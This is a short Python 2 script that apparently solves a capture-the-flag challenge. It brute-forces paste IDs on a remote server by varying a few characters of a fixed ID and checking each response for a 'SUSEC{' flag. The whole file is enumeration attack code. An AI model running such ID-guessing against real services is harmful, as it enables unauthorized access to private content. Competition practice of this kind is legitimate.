import requests
import time
url="http://69.90.132.70:1339/paste/"
string = []
alpha = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_'
for a in '01234':
    for b in 'abc':
        for c in alpha:
            string.append('Xkva{}{}rqXd6tZvr{}'.format(a, b, c))
            #print string
#print string        
sd =string
for x in sd:
    print x 
    url1=url+x
    conn=requests.get(url1)
    #time.sleep(1)
    out= conn.content
    if "SUSEC{"in out:
        print "GOT FLAG",out,x
        break
